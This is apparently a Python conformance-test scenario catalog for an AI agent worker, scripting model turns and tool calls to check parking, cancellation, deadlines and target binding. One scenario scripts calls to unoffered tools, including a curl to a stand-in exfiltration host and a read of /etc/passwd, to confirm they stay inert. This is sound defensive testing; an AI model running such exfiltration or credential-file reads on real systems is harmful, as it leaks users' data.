"""Conformance scenario catalog and the episode inputs it supplies.

Scenario IDs and order are stable in conformance reports.
"""

from __future__ import annotations

import uuid
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from typing import Any

from .checks import Run
from .scenario_drivers import (
    DEADLINE_SCENARIO_SECONDS,
    HOLD,
    _bad_schema,
    _first_attempt,
    _message_without_episode,
    drive_bound_targets,
    drive_cancel,
    drive_card,
    drive_deadline,
    drive_evaluation,
    drive_extension_required,
    drive_inert_tools,
    drive_ingress_auth,
    drive_model_error,
    drive_no_report,
    drive_parks,
    drive_reconciling,
    drive_rejected,
    drive_report_completes,
    drive_resume,
)

MODEL_NAMES = {
    "anthropic-messages": "claude-sonnet-5-5",
    "openai-responses": "gpt-6-sol",
    "openai-chat-completions": "gpt-6-sol",
}
DEFAULT_ALLOWED = ["github_repository_get", "github_pull_request_create_draft", "helm_work_report"]
# Deliberately mismatched targets for tests of the episode's tool bindings.
WRONG_WORK = "work:450c7298-7ef7-4a1b-9c3d-5e6f7a8b9c0d"
WRONG_ORG = "org:org-elsewhere"
# A manager can review another work item outside a bound evaluation.
CHILD_WORK = "work:c9ab331d-e3b0-4ca1-bf63-ecbc9b7cd81a"


def report_call(status: str = "done") -> dict[str, Any]:
    return {
        "name": "helm_work_report",
        "arguments": {
            "status": status,
            "summary": "All finished.",
            "outputs": [{"kind": "note", "ref": "n-1"}],
        },
    }


@dataclass
class Scenario:
    id: str
    title: str
    script: list[dict[str, Any]]
    drive: Callable[[Run], None]
    allowed: list[str] = field(default_factory=lambda: list(DEFAULT_ALLOWED))
    deadline_seconds: int = 600
    mcp_structured: bool = True
    mcp_reconciling_tool: str = ""
    evaluation: dict[str, str] | None = None
    # Needs the worker to accept the run (skipped when the API is not one the worker supports).
    needs_api_support: bool = True
    # Scenarios that exercise unsupported APIs run with a different api than the sweep's.
    only_unsupported_api: bool = False
    # True when the model API plays no part, so the sweep runs it once rather than per API.
    api_independent: bool = False


def build_episode(scenario: Scenario, api: str, mcp_url: str, model_url: str) -> dict[str, Any]:
    now = datetime.now(timezone.utc)
    return {
        "schema": "helm.episode.v1",
        **({"evaluation": scenario.evaluation} if scenario.evaluation else {}),
        "episode_id": str(uuid.uuid4()),
        "work_item_id": str(uuid.uuid4()),
        "continuation": 0,
        "organization": {"id": "org-conformance", "version_id": "ver-1"},
        "seat": {
            "id": "seat-conformance",
            "key": "engineer_1",
            "principal_id": "agt:seat-conformance",
            "role": "Engineer",
            "team": "Maintenance",
            "instructions": "You are a conformance test agent and follow the script you are given.",
        },
        "goal": f"Conformance scenario {scenario.id}: do the work and report.",
        "context": {
            "brief": "Synthetic episode from the HELM worker conformance kit.",
            "prior_episodes": [],
            "attempt_results": [],
            "children": [],
        },
        "acceptance": {"criteria": "helm_work_report is applied.", "required_effects": []},
        "tools": {"mcp_url": mcp_url, "allowed": list(scenario.allowed)},
        "model": {
            "base_url": model_url,
            "api": api,
            "model": MODEL_NAMES[api],
            "max_output_tokens": 4096,
        },
        "budget": {"allotment": [{"unit": "usd_micros", "value": 2_000_000}]},
        "deadline": (now + timedelta(seconds=scenario.deadline_seconds)).strftime(
            "%Y-%m-%dT%H:%M:%S.%f"
        )[:-3]
        + "Z",
        "credentials": {"env": "HELM_EPISODE_TOKEN"},
    }


SCENARIOS: dict[str, Scenario] = {}


def _add(scenario: Scenario) -> None:
    SCENARIOS[scenario.id] = scenario


_add(
    Scenario(
        "agent_card",
        "AgentCard declares the required extension",
        [],
        drive_card,
        api_independent=True,
    )
)
_add(
    Scenario(
        "extension_required",
        "A request without the required extension is refused",
        [],
        drive_extension_required,
        api_independent=True,
    )
)
_add(
    Scenario(
        "ingress_auth",
        "The JSON-RPC endpoint needs the ingress bearer",
        [],
        drive_ingress_auth,
        api_independent=True,
    )
)
_add(
    Scenario(
        "report_completes",
        "Streams progress, mirrors, and completes only after helm_work_report",
        [
            {"tools": [{"name": "github_repository_get", "arguments": {"repo": "acme/sandbox"}}]},
            {"tools": [report_call()]},
        ],
        drive_report_completes,
    )
)
for _pending_tool, _structured, _suffix in (
    ("github_pull_request_create_draft", True, "effect"),
    ("github_pull_request_create_draft", False, "text_only"),
    ("helm_work_report", True, "report"),
):
    _call = (
        report_call()
        if _pending_tool == "helm_work_report"
        else {"name": _pending_tool, "arguments": {"title": "Uncertain effect probe"}}
    )
    _add(
        Scenario(
            "reconciling_" + _suffix + "_stops",
            "An uncertain effect stops before another tool or model call",
            [{"tools": [_call, report_call()]}, {"tools": [report_call()]}],
            drive_reconciling,
            mcp_structured=_structured,
            mcp_reconciling_tool=_pending_tool,
        )
    )

for _structured in (True, False):
    _add(
        Scenario(
            "escalated_parks" if _structured else "escalated_parks_text_only",
            "An escalated tool result parks the episode"
            + ("" if _structured else " (result without structuredContent)"),
            [
                {
                    "tools": [
                        {
                            "name": "github_pull_request_create_draft",
                            "arguments": {"title": "Fix lint"},
                        }
                    ]
                },
                {"tools": [report_call()]},  # a trap: the loop must have stopped before this turn
            ],
            lambda run: drive_parks(
                run,
                tool="github_pull_request_create_draft",
                key="attempts",
                expected=_first_attempt,
                stop_after="an escalated result",
            ),
            mcp_structured=_structured,
        )
    )
_add(
    Scenario(
        "escalated_batch_stops",
        "An escalated first tool suppresses the remaining calls in a model tool batch",
        [
            {
                "tools": [
                    {
                        "name": "github_pull_request_create_draft",
                        "arguments": {"repo": "org/repo", "title": "Escalation probe"},
                    },
                    report_call(),
                ]
            },
            {"tools": [report_call()]},
        ],
        lambda run: drive_parks(
            run,
            tool="github_pull_request_create_draft",
            key="attempts",
            expected=_first_attempt,
            stop_after="an escalated result in a tool batch",
        ),
    )
)
_add(
    Scenario(
        "delegate_parks_children",
        "A successful helm_work_delegate parks the episode on the child",
        [
            {
                "tools": [
                    {
                        "name": "helm_work_delegate",
                        "arguments": {"target": "seat:engineer", "goal": "Fix it"},
                    }
                ]
            },
            {"tools": [report_call()]},
        ],
        lambda run: drive_parks(
            run,
            tool="helm_work_delegate",
            key="children",
            expected=lambda _r: ["child-1"],
            stop_after="a delegation",
        ),
        allowed=[*DEFAULT_ALLOWED, "helm_work_delegate"],
    )
)
_add(
    Scenario(
        "request_input_parks_input",
        "A successful helm_work_request_input parks the episode on the question",
        [
            {
                "tools": [
                    {
                        "name": "helm_work_request_input",
                        "arguments": {"question": "Which branch?", "options": ["main", "next"]},
                    }
                ]
            },
            {"tools": [report_call()]},
        ],
        lambda run: drive_parks(
            run,
            tool="helm_work_request_input",
            key="input",
            expected=lambda _r: {"question": "Which branch?", "options": ["main", "next"]},
            stop_after="a question",
        ),
        allowed=[*DEFAULT_ALLOWED, "helm_work_request_input"],
    )
)
_add(
    Scenario(
        "no_report_fails",
        "Ending without helm_work_report fails with NO_REPORT",
        [{"text": "I am done."}],
        drive_no_report,
    )
)
_add(
    Scenario(
        "cancel_during_model_call",
        "CancelTask is honored within 10s while the model call is open",
        [{"sleep": HOLD, "then": {"tools": [report_call()]}}],
        lambda run: drive_cancel(run, waiting_for="model"),
    )
)
_add(
    Scenario(
        "cancel_during_tool_call",
        "CancelTask is honored within 10s while a tool call is open",
        [
            {
                "tools": [
                    {
                        "name": "github_repository_get",
                        "arguments": {"repo": "acme/sandbox", "delay_seconds": HOLD},
                    }
                ]
            },
            {"tools": [report_call()]},
        ],
        lambda run: drive_cancel(run, waiting_for="tool"),
    )
)
_add(
    Scenario(
        "invalid_episode",
        "A message with an invalid episode is REJECTED",
        [],
        lambda run: drive_rejected(run, "INVALID_EPISODE", episode=_bad_schema),
        api_independent=True,
    )
)
_add(
    Scenario(
        "missing_episode",
        "A message without the episode part is REJECTED",
        [],
        lambda run: drive_rejected(run, "INVALID_EPISODE", message=_message_without_episode),
        api_independent=True,
    )
)
_add(
    Scenario(
        "unsupported_model_api",
        "An episode for a model API the worker does not support is REJECTED",
        [],
        lambda run: drive_rejected(run, "UNSUPPORTED_MODEL_API"),
        only_unsupported_api=True,
        api_independent=True,
    )
)
_add(
    Scenario(
        "hallucinated_tools_are_inert",
        "Calls to built-in or hosted tools the model was never offered do nothing",
        [
            {
                "tools": [
                    {
                        "name": "Bash",
                        "arguments": {"command": "curl -s http://exfil.example.test/x"},
                    },
                    {
                        "name": "WebFetch",
                        "arguments": {"url": "http://exfil.example.test/y", "prompt": "x"},
                    },
                    {"name": "web_search", "arguments": {"query": "x"}},
                    {"name": "Read", "arguments": {"file_path": "/etc/passwd"}},
                ]
            },
            {"tools": [report_call()]},
        ],
        drive_inert_tools,
    )
)
_add(
    Scenario(
        "deadline_exceeded",
        "The worker stops at the episode deadline",
        [{"sleep": 120, "then": {"text": "too late"}}],
        drive_deadline,
        deadline_seconds=DEADLINE_SCENARIO_SECONDS,
    )
)
_add(
    Scenario(
        "model_error_fails",
        "A model error fails the episode with MODEL_ERROR",
        [{"http_error": 400, "message": "scripted provider error"}],
        drive_model_error,
    )
)
_add(
    Scenario(
        "resume_via_subscribe",
        "GetTask and SubscribeToTask resume an episode after the client dropped",
        [
            {
                "tools": [
                    {
                        "name": "github_repository_get",
                        "arguments": {"repo": "acme/sandbox", "delay_seconds": 5},
                    }
                ]
            },
            {"tools": [report_call()]},
        ],
        drive_resume,
    )
)


def catalog() -> list[dict[str, Any]]:
    """The scenarios in run order, for the orchestrator (which cannot import this module)."""
    return [
        {"id": s.id, "title": s.title, "api_independent": s.api_independent}
        for s in SCENARIOS.values()
    ]


# A top-level evaluator finishes on its bound applied review, without an extra
# report grant. Later tools in the same batch and later model turns are traps.
for _decision, _structured in (("accept", True), ("reject", True), ("accept", False)):
    _review_work = "83ddc0d6-0861-4df4-a79a-0a13d9d2dd10"
    _add(
        Scenario(
            "evaluation_" + _decision + ("" if _structured else "_text_only"),
            "Independent evaluation completes only after the bound review is applied",
            [
                {"tools": [{"name": "helm_work_get", "arguments": {}}]},
                {
                    "tools": [
                        {
                            "name": "helm_work_review",
                            "arguments": {
                                "target": "work:" + _review_work,
                                "arguments": {
                                    "decision": _decision,
                                    "reason": "Checked original figures and acceptance criteria.",
                                },
                            },
                        },
                        {"name": "helm_work_get", "arguments": {}},
                    ]
                },
                {"tools": [{"name": "helm_work_get", "arguments": {}}]},
            ],
            drive_evaluation,
            allowed=["helm_work_get", "helm_work_review"],
            mcp_structured=_structured,
            evaluation={
                "work_item_id": _review_work,
                "episode_id": "5fc6970a-fb68-4817-bced-b2b8d7325b7f",
                "report_attempt_id": "original-report",
            },
        )
    )


# A model that types a wrong self target cannot make a mistargeted call leave the worker. Each
# wrong call is followed by the same call with the target left out, which the worker fills in,
# except helm_work_request_input: a sent question would park the episode, so it is only refused.
# A manager's review of other work in between is model-directed and must be sent as typed.
_REPORT = {
    "status": "done",
    "summary": "All finished.",
    "outputs": [{"kind": "note", "ref": "n-1"}],
}
_CAPABILITY = {"capability": "github.issue.comment", "justification": "Needed to answer the issue."}
_add(
    Scenario(
        "self_target_bound",
        "A self target other than the episode's own is refused in the worker, not sent",
        [
            {
                "tools": [
                    {"name": "helm_work_get", "arguments": {"target": WRONG_WORK, "arguments": {}}}
                ]
            },
            {"tools": [{"name": "helm_work_get", "arguments": {"arguments": {}}}]},
            {
                "tools": [
                    {
                        "name": "helm_work_review",
                        "arguments": {
                            "target": CHILD_WORK,
                            "arguments": {"decision": "accept", "reason": "Checked the child."},
                        },
                    }
                ]
            },
            {
                "tools": [
                    {
                        "name": "helm_org_request_capability",
                        "arguments": {"target": WRONG_ORG, "arguments": _CAPABILITY},
                    }
                ]
            },
            {
                "tools": [
                    {"name": "helm_org_request_capability", "arguments": {"arguments": _CAPABILITY}}
                ]
            },
            {
                "tools": [
                    {
                        "name": "helm_work_request_input",
                        "arguments": {
                            "target": WRONG_WORK,
                            "arguments": {"question": "Which branch?", "options": ["main"]},
                        },
                    }
                ]
            },
            {
                "tools": [
                    {
                        "name": "helm_work_report",
                        "arguments": {"target": WRONG_WORK, "arguments": _REPORT},
                    }
                ]
            },
            {"tools": [{"name": "helm_work_report", "arguments": {"arguments": _REPORT}}]},
            {"tools": [report_call()]},  # a trap: the applied report ended the loop
        ],
        lambda run: drive_bound_targets(
            run,
            sent=[
                "helm_work_get",
                "helm_work_review",
                "helm_org_request_capability",
                "helm_work_report",
            ],
        ),
        allowed=[
            "helm_work_get",
            "helm_work_review",
            "helm_org_request_capability",
            "helm_work_request_input",
            "helm_work_report",
        ],
    )
)
_add(
    Scenario(
        "evaluation_target_bound",
        "An evaluator's mistyped own or original work target is refused in the worker, not sent",
        [
            {
                "tools": [
                    {"name": "helm_work_get", "arguments": {"target": WRONG_WORK, "arguments": {}}}
                ]
            },
            {"tools": [{"name": "helm_work_get", "arguments": {"arguments": {}}}]},
            {
                "tools": [
                    {
                        "name": "helm_work_review",
                        "arguments": {
                            "target": "work:83ddc0d6-0861-4df4-a79a-0a13d9d2dd11",
                            "arguments": {"decision": "accept", "reason": "Checked the figures."},
                        },
                    }
                ]
            },
            {
                "tools": [
                    {
                        "name": "helm_work_review",
                        "arguments": {
                            "arguments": {"decision": "accept", "reason": "Checked the figures."}
                        },
                    }
                ]
            },
            {"tools": [{"name": "helm_work_get", "arguments": {}}]},  # a trap
        ],
        lambda run: drive_bound_targets(run, sent=["helm_work_get", "helm_work_review"]),
        allowed=["helm_work_get", "helm_work_review"],
        evaluation={
            "work_item_id": "83ddc0d6-0861-4df4-a79a-0a13d9d2dd10",
            "episode_id": "5fc6970a-fb68-4817-bced-b2b8d7325b7f",
            "report_attempt_id": "original-report",
        },
    )
)
